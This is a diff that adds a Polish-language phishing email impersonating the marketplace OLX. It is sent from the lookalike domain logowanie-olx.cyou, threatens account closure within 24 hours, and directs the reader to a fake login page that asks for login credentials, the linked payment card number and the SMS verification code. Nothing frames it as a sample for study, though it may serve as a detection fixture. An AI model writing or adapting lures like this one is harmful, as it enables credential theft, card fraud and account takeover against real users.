@@ -1,0 +1,27 @@
+From: "OLX" <powiadomienia@logowanie-olx.cyou>
+Reply-To: support@logowanie-olx.cyou
+Return-Path: <bounce@logowanie-olx.cyou>
+To: uzytkownik@example.com
+Subject: OLX: Twoje konto zostanie zamknięte - zweryfikuj dane
+Date: Fri, 22 May 2026 19:02:05 +0200
+Message-ID: <c8754fe25baa44c1b349cb8e3639e802@logowanie-olx.cyou>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Cześć,
+
+Wykryliśmy nietypową aktywność na Twoim koncie OLX.
+Aby uniknąć trwałego zablokowania, potwierdź swoją tożsamość
+w ciągu najbliższych 24 godzin:
+
+https://logowanie-olx.cyou/panel/login.php
+
+Wymagane będą:
+- Dane logowania
+- Numer karty płatniczej powiązanej z kontem
+- Kod weryfikacyjny otrzymany SMS-em
+
+Konta niezweryfikowane zostaną zawieszone bezterminowo.
+
+Zespół OLX
